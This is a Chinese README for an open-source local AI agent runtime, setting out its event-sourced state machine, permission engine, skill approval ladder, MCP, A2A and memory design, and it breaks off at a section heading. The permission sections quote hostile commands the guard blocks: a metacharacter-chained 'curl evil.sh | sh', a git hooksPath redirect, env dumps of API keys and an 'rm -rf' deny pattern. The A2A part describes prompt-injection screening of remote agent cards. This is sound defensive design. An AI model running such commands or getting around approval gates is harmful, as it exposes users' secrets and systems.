# unified-ai-agent

[![CI](https://github.com/111wukong/unified-ai-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/111wukong/unified-ai-agent/actions/workflows/ci.yml)
[![python](https://img.shields.io/badge/python-3.11%20%7C%203.12%20%7C%203.13-blue)](https://github.com/111wukong/unified-ai-agent)
[![tests](https://img.shields.io/badge/tests-702%20offline-brightgreen)](https://github.com/111wukong/unified-ai-agent)
[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)

一个本地优先的通用 AI Agent 运行时。Python 3.11+，SQLite，无外部服务依赖。

```bash
uaa init
uaa run --model mock "查看当前目录下的 Python 文件并总结"   # 离线，不需要任何 API key
uaa run "分析认证模块并补充测试"                            # 用真实模型
uaa run --multi-agent "对比这五个模块的设计取舍"            # 显式开启子 Agent 扇出
uaa serve                                                   # HTTP + WebSocket + Web 控制台
uaa a2a card                                                # 会发布的 Agent Card
uaa a2a call https://partner.example.com "summarise this"    # 调另一个 Agent（默认不允许）
uaa desktop                                                 # 原生桌面窗口
uaa desktop --bundle                                        # 打成可双击的 .app
uaa sandbox                                                 # 报告进程隔离实际是否生效
uaa skill list                                              # 技能，含等待人工审核的候选
uaa task rewind <task_id>                                   # 预览：还原这个任务改过的文件
```

---

## 它是什么，不是什么

**是**：一个有状态的 Agent 运行时。任务可中断、可恢复、可审计，工具权限可强制，上下文有预算，技能可沉淀。

**不是**：又一个「把 LangGraph / CrewAI / AutoGen 的优点缝在一起」的框架。那种项目通常的结局是同时继承四家的缺点，还多一层自己的 bug。

### 设计主张

CrewAI 的强项是角色化的人体工学，LangGraph 的强项是有类型的图状态 + checkpoint，AutoGen 的强项是对话式多 Agent 协作。**这三样在第一版里没法同时做好。** 能做的只有一件事：

> 选一个真正可靠的执行内核，然后把其余范式做成内核之上的**薄层**。

这个项目选的内核是**事件溯源的有限状态机**。角色 = 配置预设，图 = 声明式工作流文件，对话 = 多 Agent 层的一种策略 —— 都还没有实现，但都只需要加层，不需要改内核。

而真正的护城河是**三家都没做好**的三件事：

| | LangGraph | CrewAI | AutoGen | 本项目 |
|---|---|---|---|---|
| 崩溃后「在途工具调用」的语义 | 部分 | 无 | 无 | **写前台账 + 幂等性判定** |
| 上下文预算与压缩 | 手动 | 无 | 无 | **主动压缩 + 确定性兜底** |
| 每步都调一次 LLM 做反思 | — | — | 是（token 成本 5–6×） | **只调一次，且只在任务结束时** |
| 技能能否自升级 | — | — | — | **状态机强制人工闸门** |

---

## 快速开始

```bash
python3 -m venv .venv && .venv/bin/pip install -e ".[dev]"
.venv/bin/uaa init
.venv/bin/uaa doctor          # 检查环境、密钥、权限策略
.venv/bin/uaa tools           # 列出工具及其权限等级
.venv/bin/uaa demo            # 离线端到端演示
```

配置模型（任意 OpenAI 兼容端点：OpenAI / DeepSeek / 通义千问 / Ollama / LM Studio / vLLM）：

```bash
export DEEPSEEK_API_KEY=sk-...
.venv/bin/uaa config set default_model deepseek
.venv/bin/uaa run "找出所有 TODO 并分类"
```

---

## 核心概念

### 1. 事件是真相，状态是折叠

`events` 表 append-only，是唯一真相。`tasks.state` 是给 `task list/show` 用的投影，**恢复时由 `replay()` 重新折叠出来**。两者不一致时，投影错。

好处：不可能「恢复到一个从未存在过的状态」。这是事件溯源在 Agent 上最实际的收益。

```bash
uaa task events <task_id>   # 看真相
uaa task show <task_id>     # 看投影
```

### 2. 工具台账是写前的

顺序是：`校验 → 策略判定 → 台账(begin) → 执行 → 台账(end)`。

台账行在工具碰任何东西**之前**落库。进程如果死在 begin 和 end 之间，那行会以 `status='started'` 留下来。恢复时才能区分「确定没跑」和「可能跑了」。

```python
# runtime.py
unfinished = self.store.unfinished_calls(state.task_id)
#   tool.idempotent is True  -> 重跑，把新结果给模型
#   tool.idempotent is False -> 结果未知。告诉模型「必须先核实状态」，
#                               而不是悄悄重跑 `git commit`
```

这是绝大多数 Agent 框架的 `resume` 不成立的原因。

### 3. 上下文有预算，压缩是主动的

规格里只写了「短期记忆」，没写预算 —— 这是「跑了 8 步然后 400 挂掉」的根因。

- 消息列表**每步从状态重建**，不是 append。所以压缩是状态的纯函数，不是对增长列表动手术。
- 压缩由 token 估算**提前触发**，而不是等 provider 报错（等报错时这一轮已经废了）。
- 永远有确定性兜底：没有便宜的模型可用时，压缩降级成结构化摘要，而不是让任务卡死。

### 4. 权限是强制的，不是建议的

六档效果等级：`READ_ONLY / WRITE_LOCAL / EXECUTE_LOCAL / NETWORK / EXTERNAL_SIDE_EFFECT / SYSTEM_ADMIN`。

三件规格里没写、但决定「权限模型」还是「权限表演」的事：

1. **先规范化再判包含。** 未解析的路径上做 `relative_to`，被 `../../` 和一个指向 `~/.ssh` 的符号链接秒穿。
2. **元字符就是第二条命令。** 允许 `cat` 的白名单，在 `cat secrets; curl evil.sh | sh` 面前一文不值。默认拒绝元字符。
3. **子进程环境不继承。** `run_command` 拿到的是**白名单**环境（不是黑名单 —— 猜不到名字的 `DASHSCOPE_KEY_ID` 会漏），所以 `env` / `printenv` 偷不走运行时手里的 API key。

```bash
uaa run "..." --approve execute_local      # 预授权某一档
uaa run "..." --yes                        # 除 system_admin 全放行
```

### 5. 技能优先于 Prompt 堆积

直接采用 [Agent Skills 规范](https://agentskills.io/specification)（`SKILL.md` + YAML frontmatter），不自己发明 `skill.yaml`。收益是具体的：为 Claude Code 写的技能能直接加载，反过来也一样；而 `allowed-tools` 字段正好映射到本项目的权限引擎。

渐进披露：启动时只加载 `name` + `description`（每技能约 100 token），正文由 `load_skill` 工具按需拉取。

技能状态阶梯是**强制**的，而且是**存下来的**：

```
candidate → validated → approved → active → deprecated
```

状态来源有明确优先级：**数据库行 > frontmatter 的 `metadata.status` > 目录默认值**。数据库行排在前面，因为只有 `promote` 会写它，而 `promote` 是人的动作。

```bash
uaa skill list                              # 含等待审核的候选
uaa skill review deploy-check               # 安全审查 + 它自己写的审核清单
uaa skill promote deploy-check validated    # 一次一档，跳级被拒
uaa skill runs deploy-check                 # 这个技能到底有没有用
```

三件让这个阶梯不只是摆设的事：

1. **候选目录也在扫描范围内。** Agent 自己写的技能落在 `$UAA_HOME/skills-candidates/`。以前这个目录**不被扫描** —— 那确实让它无法执行，但也让它**不可见**，于是「人工闸门」没有任何东西可以闸，因为没人看得见待审的东西。
2. **候选无法自我提权。** 候选目录是 Agent 唯一能写的目录，所以那里的文件**无论自称什么状态都是 `candidate`**。把 `metadata.status` 改成 `active` 不会让它变成 active —— 阶梯才是权威，不是文件。
3. **每次加载技能都记一笔账。** `skill_runs` 记录哪个任务加载了哪个技能、结局如何。这是 `deprecate` 唯一的证据来源；没有它，退役一个技能只能凭感觉。

`delegate` 工具（多 Agent）是**缺席**而不是「拒绝」：关掉时它不在工具目录里。一个列在提示词里、调用永远失败的工具有两个代价 —— 一次白花的模型调用，以及让模型学会「工具目录会骗人」。

### 6. 模型无关靠的是能力矩阵，不是一个 Protocol

六行的 `ChatModel` Protocol 藏起了真正会坏的东西：OpenAI 支持严格 JSON Schema，Anthropic 不支持；Ollama 和大多数本地模型根本没有原生 tool calling。

```python
class ModelCapabilities:
    native_tool_calling: bool   # False -> 自动套 TextProtocolModel 降级层
    json_schema: bool           # False -> 规划走 JSON object + 修复环
    max_context_tokens: int     # -> 上下文预算的输入
    prompt_cache: bool          # -> 是否给稳定前缀打 cache 断点
```

一个适配器覆盖 OpenAI / DeepSeek / 通义千问 / Moonshot / OpenRouter / vLLM / LM Studio / Ollama —— 因为它们是同一个线格式。Anthropic 单独原生实现，因为差异是真的。

---

## 配置：读-改-写，所以序列化必须全量

```bash
uaa config set agent.max_steps 12
uaa config set multi_agent.enabled true
uaa config set permissions.network.max_response_bytes 500000
uaa config show
```

`uaa config set` 是**读-改-写**：加载整个文件、改一个键、把整份写回去。所以序列化器漏掉一个节不是「少写一行」，而是**把用户的设置从文件里删掉**。

原来的序列化器手写了一个节列表（`models` / `permissions` / `agent`），于是 `[permissions.network]`、`[sandbox]`、`[memory]`、`[multi_agent]` 都会在下次 `config set` 时消失——最尖的一处是手写的网络白名单，它会在有人改一次步数预算时无声蒸发。

现在序列化**遍历模型字段**而不是列举节，并且 `tests/test_config_round_trip.py` 遍历**整个配置面**做往返断言：以后新增字段忘了序列化会测试失败，而不是吃掉用户的配置。

两条附带规则：

- **`home` / `workspace` 永不写入文件。** 它们由调用方决定，而且 `load_settings` 在 `**raw` 之前显式传它们——文件里出现这两个键会直接 `TypeError`，还是这个工具自己写出来的文件。
- **`config set` 会校验单个字段。** `setattr` 不触发 pydantic 校验，所以 `config set sandbox.mode read-only` 原本会存下裸字符串，字段类型悄悄不再是 `SandboxMode`。

> 权限决策的写法变了：现在是 `[permissions.defaults]` 子表。`network = "confirm"` 这种裸键简写**仍然可读**（校验器两种都收），但它无法和 `[permissions.network]` 表共存——TOML 不允许同一个键既是值又是表，而 `network` 恰好两样都是。

---

## 架构

```
CLI (typer + rich)
  └── AgentRuntime                     状态机 + 预算硬限 + 中断恢复
        ├── Planner                    结构化输出 + 修复环
        ├── ContextBuilder             预算 / 主动压缩 / 确定性兜底
        ├── ToolRunner                 校验 → 策略 → 写前台账 → 执行 → 截断外置
        ├── Reflector                  任务结束后一次：记忆 + 技能候选
        ├── MultiAgentRunner           子 Agent = 带 parent_task_id 的普通任务
        └── PermissionEngine           路径围栏 / 命令守卫 / 域名白名单 / 环境脱敏
              ├── A2AServer             远端任务 = 普通任务 + session metadata 记归属
              ├── ToolRegistry         builtin + skills + MCP + delegate
              ├── SkillRegistry        SKILL.md 规范 + 安全审查 + 持久化状态阶梯
              ├── ModelRegistry        能力矩阵 + 适配器
              └── Store                SQLite: events / tasks / tool_calls / artifacts / memories(FTS5) / skills
```

### 目录

```
src/unified_agent/
├── types.py            EffectClass / Message / ToolCall / 幂等键
├── config.py           TOML 结构化配置 + env 覆盖
├── errors.py
├── cli.py
├── agent/
│   ├── state.py        AgentState / PlanStep / LogEntry / replay()
│   ├── rewind.py       文件检查点与回退：从事件算出该还原什么
│   ├── runtime.py      主循环、预算闸门、恢复语义、HITL
│   ├── context.py      预算与压缩
│   ├── planner.py      结构化规划 + 修复环
│   ├── executor.py     写前台账、截断外置
│   ├── reflector.py    记忆提取 + 技能候选
│   ├── prompts.py
│   └── factory.py      装配
├── tools/
│   ├── base.py         Tool / ToolSpec / 小型 JSON Schema 校验器
│   ├── permissions.py  路径围栏、命令守卫、环境脱敏
│   ├── fs.py           read_file / write_file / apply_patch / list_directory / search_files / file_info
│   ├── git.py          git_status / git_diff / git_log（READ_ONLY，免确认）/ git_commit（必须确认）
│   ├── shell.py        run_command / run_tests / run_linter（自动识别项目 venv）
│   ├── net.py          http_get / http_post（重定向逐跳复检白名单）
│   ├── mcp.py          MCP stdio 客户端（双协议时代）
│   ├── multi_agent.py  delegate 工具：规模规则写进描述，效果等级取子 Agent 上限
│   ├── memory_tools.py save_memory / search_memory / load_skill / update_plan / finish
│   └── registry.py
├── orchestration/
│   ├── workflow.py     DSL 解析 + 静态校验（DAG、引用、可达性、审批）
│   ├── expressions.py  `{{#node.field#}}` 解析与条件求值
│   ├── runner.py       执行器：工作流运行本身是一个 task
│   └── multi_agent.py  编排者-工作者：契约、并发上限、子 Agent 预算、报告落盘
├── a2a/                Agent 间通信（v1.0：Card + JSON-RPC + SSE）
│   ├── types.py        5 个核心对象 + 8 个任务状态（含状态映射）
│   ├── card.py         发布什么：只广告 active 技能，能力声明可校验
│   ├── security.py     SSRF 防线（scheme → allowlist → 解析地址必须公网）+ 不可信卡片审查
│   ├── server.py       JSON-RPC：message/send · message/stream · tasks/get · tasks/cancel
│   └── client.py       调远端：逐跳复检重定向，卡片自己的 url 也过检查
├── memory/
│   ├── embeddings.py   向量提供方：OpenAI 兼容 / 离线哈希 / 无
│   ├── vector.py       cosine 检索，sqlite-vec 加速、纯 Python 兜底
│   └── extract.py      抽取 + 矛盾调和（add/update/duplicate/none）
├── desktop/
│   ├── launcher.py     服务线程 + 系统 webview 窗口 + 健康门
│   ├── bundle.py       .app 打包 + 纯标准库生成图标
│   └── __main__.py     bundle 里的可执行入口
├── api/
│   ├── app.py          FastAPI：REST + AG-UI(SSE) + WebSocket + 控制台挂载
│   ├── agui.py         AG-UI 编码器（内部事件 → 协议事件）
│   └── console/        零构建 Web 控制台（原生 JS/CSS）
├── sandbox/
│   └── base.py         Seatbelt / Docker / None，探测式可用性 + 回退留痕
├── models/
│   ├── base.py         ChatModel / ModelCapabilities / 文本协议降级
│   ├── openai_compat.py
│   ├── anthropic.py
│   ├── mock.py         离线确定性模型（测试与 demo）
│   └── registry.py
├── skills/             SKILL.md 加载、规范校验、安全审查、状态阶梯（DB 持久化）
├── storage/            SQLite schema、事件存储、工具台账、产物
└── observability/      事件词汇表、JSONL sink、密钥脱敏
```

---

## MCP 的双协议时代

MCP 在 **2026-07-28** 做了一次破坏性改版：删掉 `initialize`/`initialized` 握手和 `Mcp-Session-Id`，协议层变成**无状态**，协议版本/客户端身份/能力改为每请求走 `_meta`，并新增 `server/discover`。官方明确说跨这条线**不保证互通**。

所以客户端必须做时代探测：先试 `server/discover`，失败再退回 `initialize` 握手。

```toml
[[mcp_servers]]
name = "filesystem"
command = "npx"
args = ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
effect_class = "execute_local"      # 第三方服务器不能自己声明权限等级
requires_confirmation = true
```

工具名会加上 `mcp__<server>__` 前缀。**第三方 MCP 服务器自称「只读」不构成它只读的证据** —— 效果等级由本地配置决定，且一律假定 `idempotent=False`。

---

## 服务层：AG-UI，不是自造的 WebSocket 格式

```bash
uaa serve                      # 控制台 http://127.0.0.1:8000/
```

前端协议直接实现 **AG-UI**（CopilotKit 与 LangGraph / Mastra / Pydantic AI / Microsoft Agent Framework 共用的开放标准），而不是自己发明一套 WebSocket 消息格式。收益是具体的：控制台可以随时换成 CopilotKit 的 React 组件，后端一行不改。

三类事件模式，覆盖了 Agent 前端的全部需求：

```
RUN_STARTED / STEP_STARTED / STEP_FINISHED / RUN_FINISHED / RUN_ERROR
TEXT_MESSAGE_START / CONTENT / END          ← 逐 token 流式
TOOL_CALL_START / ARGS / END / RESULT
ACTIVITY_SNAPSHOT (activityType="PLAN")     ← 计划直接渲染成卡片
STATE_SNAPSHOT / STATE_DELTA (RFC 6902)
CUSTOM (usage / context_compacted / tool_ambiguous …)
```

**人工确认不是单独的事件**，而是 `RUN_FINISHED` 的 `outcome`：

```json
{ "type": "interrupt", "interrupts": [ { "id": "...", "tool": "run_command", ... } ] }
```

这样前端只有一个终止事件要处理，而不是「等 RUN_FINISHED，但它不来怎么办」。

三个容易写错的地方，本实现明确处理了：

- **deltas 与最终消息不能都发。** 已经流过 token 的消息，durable 事件只负责关闭它；晚连的订阅者才需要整段文本。编码器记录哪些 messageId 流过。
- **SSE 与 WebSocket 共用同一个生成器。** 两份实现正是 WebSocket 那条路漏掉「回放历史」然后永久挂住的原因。
- **`POST /agui` 先订阅再启动任务。** 反过来会和前几个事件竞态，控制台会渲染出空计划。

```bash
curl -N -X POST http://127.0.0.1:8000/agui \
  -H 'Content-Type: application/json' \
  -d '{"messages":[{"role":"user","content":"分析这个项目"}]}'
```

---

## 工作流：加载时就能证明引用不会悬空

```bash
uaa workflow list                       # 有哪些、各自能不能加载
uaa workflow validate triage-and-fix    # 一次报出**所有**问题
uaa workflow show triage-and-fix        # 按执行顺序打印图
uaa workflow run triage-and-fix -i goal="修复失败的测试"
```

节点之间**不共享可变状态**，靠显式引用上游输出：`{{#analyse.answer#}}`。这看起来比共享状态更啰嗦，但它换来一件共享状态给不了的东西：**每个引用都能在跑之前检查**。LangGraph 的共享状态里引用错了是运行时 `KeyError`；这里是带位置的加载期错误。

加载期会检查：节点类型已知、必填字段齐全、引用指向存在的节点和**存在的字段**、引用必须指向上游、没有孤立节点（永远不跑且不吭声）、图无环、分支有兜底。

七种节点，不是四十种（Dify 有 40+ 是因为它是可视化搭建器）：

| 节点 | 做什么 |
|---|---|
| `start` | 声明输入 |
| `agent` | 跑一个完整 agent 任务（**是 task，有 `parent_task_id`**） |
| `tool` | 直接调一个工具，不经过模型 |
| `code` | 跑一段命令 —— **走 shell 工具，不在进程内执行** |
| `ifelse` | 条件分支，`when` / `else` |
| `iteration` | 对列表逐项跑 body 节点，有 `max_items` 上限 |
| `end` | 声明输出 |

**运行器是既有运行时之上的驱动，不是平行系统。** 一次工作流运行**本身就是一个 task**：所以事件流、预算、取消、A2A 的任务映射全都自动适用，一行都不用重写。`uaa task events <id>` 就能看到 `workflow_started → node_started/node_completed × N → workflow_completed`。

**工作流可以声明自己允许的副作用**（`approvals:` 或节点级 `approve:`）—— 这样它能无人值守运行，而且是可评审、可 diff 的。但 `system_admin` **不允许**由工作流授予：和 HTTP 层拒绝它的理由一样，数据文件不是策略权威。

**`code` 节点为什么不在进程内跑**：Dify 的 code 节点在服务进程里执行。工作流文件是**数据**，数据不该能伸手进运行时的内存。走 `run_command` 意味着沙箱和命令守卫照常生效。

---

## 记忆：难的不是检索，是矛盾

```bash
uaa memory stats                              # 存了什么、向量到底可不可用
uaa memory search "部署流程" --mode hybrid     # FTS5 + 向量，RRF 融合
uaa memory reindex                            # 给还没向量的记忆补上
uaa memory history <id>                       # 这条记忆以前是什么
```

调研 Mem0 / Letta / Zep 三家后收敛到同一个结论：**Agent 记忆的难点不是检索，是矛盾**。只会追加的存储会同时返回「项目用 pytest」和「已迁移到 unittest」，然后让模型去猜哪个是当前的。

所以写入路径是两段：

1. **抽取**——任务结束后提炼原子事实（就是反思那一步）。
2. **调和**——把每条候选和它最近的邻居比对，判 `add` / `update` / `duplicate` / `none`。

`update` **不覆盖**：旧行留着、`superseded_by` 指向前方、`memory_revisions` 指向后方。所以 `uaa memory history` 还能回答「这条以前是什么」——这正是 Zep 用「失效」而非「替换」的理由。

**成本控制决定了它能不能用**：只有存在邻居时才调模型。一条真正的新事实是免费的，而那是绝大多数情况。

三层各司其职，不是三选一：

| | 负责 | 什么时候不可用 |
|---|---|---|
| FTS5 trigram | 精确词；**唯一**支持中文两字查询的 | 从不 |
| 向量（cosine） | 语义近邻，sqlite-vec 加速 | 没配 embedding 模型时退化为字符 n-gram 哈希 |
| curator | 抽取 + 矛盾调和 | 没有模型时退化为精确去重 |

**离线回退是诚实的**：字符 n-gram 哈希抓的是**形式**不是**含义** —— 它能聚类近似重复和词形变化，但不会把「测试很慢」和「pytest 要四十秒」联系起来。`uaa memory stats` 会明说 `semantic: no`，而不是让结果看起来像语义检索。

---

## 多 Agent：默认关闭，而且理由充分

```bash
uaa run --multi-agent "对比这五个模块的设计取舍"
uaa config set multi_agent.enabled true      # 或者常开
uaa config set multi_agent.model gpt-4.1-mini # 子 Agent 用便宜模型
```

调研给出的数字决定了它的默认值：多 Agent 比普通对话多用 **约 15×** token（单 Agent 约 4×），而同一份资料明确说**编程任务不适合**——可并行拆分的子任务比研究类任务少得多。所以它是**显式开启 + 预算闸门**，不是默认行为。

它真正擅长的是**高度并行 + 信息量超出单上下文窗口**的活：同时看很多文件、比对很多独立方案、从很多来源收集。

编排者拿到 `delegate` 工具，把活拆成若干份。让这套东西**能跑**和**能跑对**的区别在四条规则上：

| 规则 | 为什么 |
|---|---|
| **规模规则写进工具描述** | 模型判断不了该投入多少。早期典型失败是给一个简单问题生成五十个子 Agent。描述里写明「一次事实查询 → 不要委派；两项对比 → 2–4 个」，硬上限另外在 `check()` 里强制 |
| **委派是契约，不是一句话** | 每个子 Agent 必须带**目标 + 输出格式 + 边界**（`guidance` 可选）。一句话的简报会让多个子 Agent 做**完全相同的搜索** |
| **子 Agent 的产出落盘** | 完整报告写文件，编排者只拿到**路径 + 有上限的摘要**。把每份报告都粘回父上下文就是「传话游戏」，那会让多 Agent 比单 Agent 更差 |
| **编排者是唯一写共享状态的人** | 子 Agent 默认只有 `read_only`。它们读、报告，不写——所以不会互相踩，也不会改掉编排者的计划 |

子 Agent 就是一次普通的 `AgentRuntime.run()`，带 `parent_task_id`。**这是它不需要新执行内核的原因**：预算、权限、事件流、恢复全部自动适用，`uaa task events <子任务id>` 就能看它做了什么。真正的收益也在这里——**上下文隔离是白送的**。

三个实现细节值得单独说：

- **`delegate` 的效果等级 = 它能授予的最强效果。** 如果 `multi_agent.allowed_effects` 里有 `execute_local`，那 `delegate` 自己就声明 `execute_local`，于是委派本身要过权限引擎。一个能悄悄发出比它声明的更多权限的工具，会让效果等级变成装饰。
- **`system_admin` 不允许由配置文件授予。** 和工作流审批层、HTTP 层拒绝它的理由完全一样：数据文件不是策略权威，而子 Agent 是无人值守运行的。
- **子 Agent 不反思。** 五个子 Agent 就会多五次抽取调用，而编排者本来就要对合并后的结果反思一次。

子 Agent 撞到它没被授予的效果时会**停下来问**，而不是绕过去。编排者会看到 `BLOCKED awaiting approval for \`write_file\``，并转告用户去批准那个子任务——HITL 没有被多 Agent 绕开。

---

## A2A：跨边界，不是自造协议

```bash
uaa config set a2a.enabled true                  # 发布自己
uaa config set a2a.allow_hosts partner.example.com  # 才允许调用别人
uaa a2a card                                     # 打印会发布的 Agent Card
uaa a2a check https://partner.example.com        # 先审对方的卡片，再决定要不要调
uaa a2a call https://partner.example.com "summarise this repo"
```

实现的是 [A2A v1.0](https://a2a-protocol.org) 的 JSON-RPC 绑定 + Agent Card + SSE 流式。**不自造 `AgentMessage`**（原规格 §13.4 想自造，作废）。

理由是一句话：**MCP 是 Agent 触达自己的工具，A2A 是 Agent 跨边界触达另一个 Agent。** 而边界正是自造协议必须重新推导认证、流式、取消、任务身份的地方——然后弄错其中一个。

### 最大的收益是一个**已有的状态有了标准名字**

```
SUBMITTED → WORKING → INPUT_REQUIRED / AUTH_REQUIRED
                    → COMPLETED / FAILED / CANCELED / REJECTED
```

本项目的 `waiting_confirmation` **正好就是 `INPUT_REQUIRED`**。也就是说，一次「等人工审批」的暂停可以直接表达给另一个组织，不需要为它发明字段——而且对方的状态机不用懂我们的内部词表。

内部 7 个状态到线上 8 个的映射是显式表，不是命名约定：`pending → SUBMITTED`、`planning/running → WORKING`、`waiting_confirmation → INPUT_REQUIRED`。未知状态映射为 `FAILED`——对端更需要「这次没成功」，而不是一个它解析不了的内部字符串或 500。

### 规范点名的风险，落地了哪几个

| 风险 | 本项目的做法 |
|---|---|
| **Webhook SSRF** | 不发 webhook（卡片里 `pushNotifications: false`）。但**抓取远端 Agent Card 是同一种形状**——URL 由调用方给，响应进我们的进程。同一道防线：scheme 白名单 → host allowlist → **解析后的地址必须是公网** |
| **Card 篡改 / 上下文投毒** | 远端卡片是**不可信输入**：先按 schema 校验，再把 `name` / `description` / 每个 skill 的描述跑一遍**技能安全审查那套 prompt-injection 检测器**。命中是**警告不是拒绝**——按散文拒绝会让这条线变成对任何措辞碰巧命中模式的同伴的拒绝服务 |
| Agent 冒充（Signed Cards / JWS） | **未实现**，明确写在下面的安全边界里，而不是假装没有 |
| 重放（nonce + 时间戳） | **未实现**，同上 |

三条实现上的选择：

- **有效的卡片不等于可信的卡片。** schema 校验说的是形状对，不是主机可达。所以卡片自己的 `url` 也要过 SSRF 检查，不能因为卡片解析通过就信任它。重定向**逐跳复检**——透明跟随重定向就是让白名单里的主机变成内网的代理。
- **`file` part 是拒绝，不是丢弃。** 发一个文件、拿回一个看起来正常的答案，对端会以为文件被读了。所以拒绝时要指明是哪个 part。
- **Agent Card 也在 token 守卫后面。** 这是对 A2A 公开发现约定的**刻意偏离**：卡片会列出本机配了哪些技能，而这是个本地优先的工具，整个面都在 loopback + token 之后。代价是对端必须被配置凭据而不是发现凭据——方向上更安全，而卡片自己会广告它需要的方案。

**每个远端任务都是普通任务**：走同一个 `AgentRuntime.run`，所以预算、权限、事件流、审批闸门、恢复全部适用。`contextId` 就是 session id，同一个 context 里的多次调用共享记忆与历史。唯一新增的是**归属**：session 的 metadata 记下对端是谁，否则审计日志里会出现没人能追溯到对方的活儿。

---

```bash
pip install -e ".[desktop]"     # 只多一个依赖：pywebview
uaa desktop                      # 原生窗口
uaa desktop --bundle             # ~/Applications/UnifiedAgent.app，可双击
```

> **如果 `pip install` 报 `EEXIST: mkdir .../pip-install-*/...`**，用 `uv` 装：
> `uv pip install --python .venv/bin/python "pywebview>=5.0"`。
> 这是 pip 在某些受限环境下创建临时目录失败，uv 走的是另一套机制。

## 从做得好的项目里抄来的五件事

对着 GitHub 上做得最好的几个 agent 项目（OpenHands、Aider、Cline、SWE-agent、goose、Codex CLI、Gemini CLI、Letta、mem0、smolagents）做了一轮对比，挑出**被证明有效、且能移植**的机制。五条都落地了，并且每条都带着它解决的**具体失败模式**。

### 0. 命令判定要读参数，不能只读命令名（来自 Codex CLI 的 ExecPolicy）

**失败模式**：原来的白名单按**命令名**匹配（`head == basename(entry)`），所以「允许 `python3`」实际等于「允许一切」。实测确认了两个真洞：

```
git config core.hooksPath /tmp/evil     →  ALLOW   ← 绕过上一轮对 .git/config 的写保护
python3 script.py                       →  ALLOW   ← 先 write_file 写脚本再跑 = 零元字符的任意代码
python3 -c "..."                        →  DENY    ← 但只是因为 ( 是元字符，偶然挡住
```

第三个尤其说明问题：**它是偶然被挡住的，不是被设计挡住的**。哪天有人为了别的需求打开 `allow_metacharacters`，这道防线就没了。

现在三层，**顺序就是要点**：

| 层 | 判据 | 例子 |
|---|---|---|
| 1. deny 模式 | 原文匹配 | `rm -rf` |
| 2. **forbidden 前缀 / flag** | **解析后的 argv** | `git config`、`git -c`、`python3 -c`、`find -exec`、`env`、`xargs` |
| 2b. **sticky CONFIRM** | argv 前缀，**`--yes` 压不掉** | `python3`、`node`、`npm`、`make`、`cargo`、`bash`、`git push` |
| 3. allowlist | 命令名 | `pytest`、`ls`、`git status` |

**第 2b 层是最重要的一个设计决定。** 把解释器从白名单里删掉是容易的修法，也是错的——白名单是**硬拒**而不是「退回询问」，所以删掉等于彻底封杀 `python3 script.py`，而 agent 确实需要它。正确形状是中间档：**可以跑，但永远要逐次确认**。

没有这一层，`--approve execute_local` 会悄悄变成「无人值守地跑任意代码」——那不是任何人在批准一个**效果类别**时想表达的意思。有了它，`--yes` 批准的是一类效果，而不是碰巧落在那一类里的每一次调用。

配套的还有 **惰性参数豁免**：如果命令后的每个参数都是 `--version` / `-h` 这类，就不问。`python3 --version` 只会报个版本号然后退出，为它弹窗会教会用户「这个提示是噪音」——**而一个让人关掉的护栏什么都保护不了**。豁免故意做得很窄：必须**所有**参数都惰性，所以 `python3 -h script.py` 照样问。

### 1. 文件检查点与回退（来自 Gemini CLI 的 checkpoint 思路）

**失败模式**：agent 改坏一堆文件，你只能 `git checkout` 连自己未提交的工作一起丢掉。本项目的运行时能把**状态**完美回放，却**回不了文件**——它清楚知道是哪一步毁掉的，但放不回去。

**做法**：不引入影子 git 仓库（演示项目本身就不是 git 仓库，也不该依赖 git 存在），而是把已有的写前纪律往前延伸一步：

```
ledger(begin) → checkpoint(原文件) → execute → ledger(end)
```

**在工具跑之前**抓原文件，理由和台账一样：进程死在写入中途时，事前那份是唯一留下的。工具通过 `ToolSpec.snapshot_paths` **声明**哪些参数指向文件，于是「这个工具能破坏什么」可以从工具自己的定义里读出来。

原文件**原样存储、不脱敏**——这是对「产物一律脱敏」的一条刻意例外：检查点存在的意义就是**逐字节写回**，脱敏过的副本还原出来是坏文件。内容本来就是工作区里的文件，同一个信任域。

```bash
uaa task rewind <task_id>            # 默认只预览
uaa task rewind <task_id> --apply    # 真还原
uaa task rewind <task_id> --from-seq 42   # 只撤销 seq 42 之后的写入
```

预览是默认，`--apply` 才动手：还原文件是**唯一真正有破坏性的那件事**（可能覆盖 agent 之后的人工改动），所以它必须被明确要求，而不是一个「看看发生了什么」的命令的默认行为。

### 2. 编辑顺序无关 + 落地前语法门禁（来自 Cline 与 SWE-agent）

**失败模式一（顺序）**：原来是把多条编辑**依次**作用在变化的字符串上。看着等价于「都对原文解析」，实际不是：

```
原文:  x = 1
       y = 2
编辑1: "x = 1" → "y = 2"
编辑2: "y = 2" → "z = 3"
```

依次执行时，编辑1 让文件变成 `y = 2\ny = 2\n`，编辑2 然后替换**第一个** `y = 2`——也就是编辑1 刚写进去的那个。原来的 `y = 2` 原封不动地留下，**模型的意图被静默反转**。文件看起来被编辑过，而且是错的。

现在每条编辑都**对原文解析**、按偏移从后往前应用，重叠的区间直接拒绝（重叠就是换了个名字的顺序依赖）。Cline 实测这一形状让 diff 成功率提升 10–25%。

**失败模式二（语法）**：一条编辑干净地落地、留下一个谁都解析不了的文件，错误会在好几步之后以一条莫名其妙的测试失败浮现，而模型基于错误前提通常会去「修」别的地方。现在**落地前先解析**：Python / JSON / TOML / YAML（都已安装的解析器，不为这个加依赖），不过就整块拒绝并回灌错误。未知扩展名不猜；`mode: append` 不检查（半截文件本来就不该能解析）；`allow_syntax_errors` 留给「就是要写一个不合法文件」的场合——**没有出口的规则会被绕过，而不是被遵守**。

### 3. 旧条目保留头部、丢掉正文（来自 Claude Code 的 MicroCompact）

**失败模式**：原来把旧工具结果压成**更小的正文**，token 照样花；预算耗尽时最老的条目被**整条丢弃**，于是模型失去了「我已经做过什么」的记录，会去重跑那些它已经看不到结果的调用。

现在超过 `keep_recent_observations` 的条目只渲染**一行**：工具、参数、成功与否、回了多少字符。几十个字符，所以**整段动作历史都放得下**，而模型真正需要的那条事实（「我已经读过 app.py，成功了」）零成本地保住了——`OUTCOME UNKNOWN` 标记也一样保住。

`should_compact` **仍然量原始日志**，这是刻意的：它触发的是**状态增长**，不是「提示词放不放得下」（渲染已经免费保证了放得下）。量渲染后的形态等于永不压缩，状态无限增长。

### 4. 模型不得销毁记忆（来自 mem0 v3）

